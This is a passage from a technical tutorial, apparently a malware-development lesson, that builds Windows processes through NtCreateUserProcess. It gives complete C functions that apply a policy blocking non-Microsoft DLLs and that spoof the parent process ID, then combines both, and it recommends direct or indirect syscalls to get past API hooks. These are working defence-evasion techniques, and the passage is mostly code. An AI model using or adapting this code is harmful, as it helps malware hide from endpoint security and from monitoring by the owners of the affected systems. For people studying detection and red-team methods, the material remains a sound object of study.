	PPS_ATTRIBUTE_LIST              pAttributeList              = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
	if (!pAttributeList)
		return FALSE;

	// initializing the &#x27;UNICODE_STRING&#x27; structures with the inputted paths
	_RtlInitUnicodeString(&amp;UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&amp;UsCommandLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&amp;UsCurrentDirectory, szTargetProcessPath);

	// calling &#x27;RtlCreateProcessParametersEx&#x27; to intialize a &#x27;PRTL_USER_PROCESS_PARAMETERS&#x27; structure for &#x27;NtCreateUserProcess&#x27;
	STATUS = RtlCreateProcessParametersEx(&amp;UppProcessParameters, &amp;UsNtImagePath, NULL, &amp;UsCurrentDirectory, &amp;UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (STATUS != STATUS_SUCCESS) {
		printf(&quot;[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
		goto _EndOfFunc;
	}

	// setting the length of the attribute list
	pAttributeList-&gt;TotalLength                     = sizeof(PS_ATTRIBUTE_LIST);

	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_IMAGE_NAME&#x27; that specifies the image&#x27;s path
	pAttributeList-&gt;Attributes[0].Attribute         = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList-&gt;Attributes[0].Size              = UsNtImagePath.Length;
	pAttributeList-&gt;Attributes[0].Value             = (ULONG_PTR)UsNtImagePath.Buffer;

	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_MITIGATION_OPTIONS&#x27; that specifies the use of process&#x27;s mitigation policies
	pAttributeList-&gt;Attributes[1].Attribute         = PS_ATTRIBUTE_MITIGATION_OPTIONS;
	pAttributeList-&gt;Attributes[1].Size              = sizeof(DWORD64);
	pAttributeList-&gt;Attributes[1].Value             = &amp;dwBlockDllPolicy;

	// creating the &#x27;PS_CREATE_INFO&#x27; structure, that will almost always look like this
	PS_CREATE_INFO					psCreateInfo = {
						.Size = sizeof(PS_CREATE_INFO),
						.State = PsCreateInitialState
	};


	// creating the process
	// hProcess and hThread are already pointers
	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &amp;psCreateInfo, pAttributeList);
	if (STATUS != STATUS_SUCCESS) {
		printf(&quot;[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n&quot;, STATUS);
		goto _EndOfFunc;
	}


_EndOfFunc:
	HeapFree(GetProcessHeap(), 0, pAttributeList);
	if (*hProcess == NULL || *hThread == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre><h3 id="38098cbd-d31a-4972-8c4a-383600be4e29" class=""><strong>Results</strong></h3><p id="8b57c199-74aa-461e-8afb-3b0e8637ddf1" class="">Invoking <code>NtCreateUserProcessForBlockDllPolicy</code> will result in the output below.</p><p id="ccdbd867-0284-4fb5-a367-fd29436db412" class="">
</p><figure id="6bbf96fb-d34c-47b7-bf76-264de3914e93" class="image"><a href="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-819850671-388c86f6-beb3-4009-b03d-2854ea61312e.png"><img style="width:1519px" src="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-819850671-388c86f6-beb3-4009-b03d-2854ea61312e.png"/></a></figure><h3 id="bfede8e3-e716-4db2-ae2f-bb99265973fe" class=""><strong>PPID Spoofing And Block DLL Policy</strong></h3><p id="314804ac-a454-46db-b070-dec6f4d3a0a1" class="">Finally, this section merges the two previous implementations into a single one by modifying the <code>PS_ATTRIBUTE_LIST</code> structure to accommodate an extra attribute and subsequently invoking the <code>NtCreateUserProcessForBoth</code> function as shown below. The <code>PS_ATTRIBUTE_LIST</code> structure will require three attributes.</p><pre id="d39ef9c6-de12-4041-b84d-60f35754ca5d" class="code code-wrap"><code>BOOL NtCreateUserProcessForBoth(
	IN      PWSTR   szTargetProcess,
	IN      PWSTR   szTargetProcessParameters,
	IN      PWSTR   szTargetProcessPath,
	IN      HANDLE  hParentProcess,
	OUT     PHANDLE hProcess,
	OUT     PHANDLE hThread
) {

	// getting the address of &#x27;RtlCreateProcessParametersEx&#x27; and &#x27;NtCreateUserProcess&#x27; from ntdll.dll
	fnRtlCreateProcessParametersEx  RtlCreateProcessParametersEx    = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;RtlCreateProcessParametersEx&quot;);
	fnNtCreateUserProcess           NtCreateUserProcess             = (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;NtCreateUserProcess&quot;);

	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL)
		return FALSE;

	NTSTATUS                        STATUS                      = NULL;
	UNICODE_STRING                  UsNtImagePath               = { 0 },
                                    UsCommandLine               = { 0 },
                                    UsCurrentDirectory          = { 0 };
	PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters        = NULL;
	// the mitigation policy flag (attribute value)
	DWORD64                         dwBlockDllPolicy            = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
	// allocating a buffer to hold the value of the attribute lists
	PPS_ATTRIBUTE_LIST              pAttributeList              = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
	if (!pAttributeList)
		return FALSE;

	// initializing the &#x27;UNICODE_STRING&#x27; structures with the inputted paths
	_RtlInitUnicodeString(&amp;UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&amp;UsCommandLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&amp;UsCurrentDirectory, szTargetProcessPath);

	// calling &#x27;RtlCreateProcessParametersEx&#x27; to intialize a &#x27;PRTL_USER_PROCESS_PARAMETERS&#x27; structure for &#x27;NtCreateUserProcess&#x27;
	STATUS = RtlCreateProcessParametersEx(&amp;UppProcessParameters, &amp;UsNtImagePath, NULL, &amp;UsCurrentDirectory, &amp;UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (STATUS != STATUS_SUCCESS) {
		printf(&quot;[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
		goto _EndOfFunc;
	}


	// setting the length of the attribute list
	pAttributeList-&gt;TotalLength                     = sizeof(PS_ATTRIBUTE_LIST);

	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_IMAGE_NAME&#x27; that specifies the image&#x27;s path
	pAttributeList-&gt;Attributes[0].Attribute         = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList-&gt;Attributes[0].Size              = UsNtImagePath.Length;
	pAttributeList-&gt;Attributes[0].Value             = (ULONG_PTR)UsNtImagePath.Buffer;

	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_MITIGATION_OPTIONS&#x27; that specifies the use of process&#x27;s mitigation policies
	pAttributeList-&gt;Attributes[1].Attribute         = PS_ATTRIBUTE_MITIGATION_OPTIONS;
	pAttributeList-&gt;Attributes[1].Size              = sizeof(DWORD64);
	pAttributeList-&gt;Attributes[1].Value             = &amp;dwBlockDllPolicy;

	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_PARENT_PROCESS&#x27; that specifies the process&#x27;s parent
	pAttributeList-&gt;Attributes[2].Attribute         = PS_ATTRIBUTE_PARENT_PROCESS;
	pAttributeList-&gt;Attributes[2].Size              = sizeof(HANDLE);
	pAttributeList-&gt;Attributes[2].Value             = hParentProcess;

	// creating the &#x27;PS_CREATE_INFO&#x27; structure, that will almost always look like this
	PS_CREATE_INFO				psCreateInfo	= {
					.Size = sizeof(PS_CREATE_INFO),
					.State = PsCreateInitialState
	};

	// creating the process
	// hProcess and hThread are already pointers
	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &amp;psCreateInfo, pAttributeList);
	if (STATUS != STATUS_SUCCESS) {
		printf(&quot;[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n&quot;, STATUS);
		goto _EndOfFunc;
	}


_EndOfFunc:
	HeapFree(GetProcessHeap(), 0, pAttributeList);
	if (*hProcess == NULL || *hThread == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre><h3 id="c2717b17-e227-47f1-9242-d19e6612d5c6" class=""><strong>Results</strong></h3><p id="57a9e5ea-084c-459e-8c36-98b5b256b9f1" class="">Executing <code>NtCreateUserProcessForBoth</code> with the right parameter will result in the following</p><p id="2979d06d-2d70-4f95-8766-be32e43346d0" class="">
</p><figure id="6ac3ffa2-7546-4a9e-9411-2e10e348aab7" class="image"><a href="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-919850979-2cf51837-c6e8-448b-a038-ab24fb7007a0.png"><img style="width:1645px" src="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-919850979-2cf51837-c6e8-448b-a038-ab24fb7007a0.png"/></a></figure><h3 id="5c6f78be-b806-40db-8740-0085e55928d6" class=""><strong>Improving The Implementation</strong></h3><p id="32f1db57-1ae3-40de-bd11-13614aba2cdb" class="">The <code>NtCreateUserProcess</code> function was retrieved using <code>GetProcAddress</code> and <code>GetModuleHandle</code> for the sake of simplicity. However, in a real-world scenario, it is recommended to use direct or indirect syscalls in case <code>NtCreateUserProcess</code> is hooked.</p></li></ul></div></article></body></html>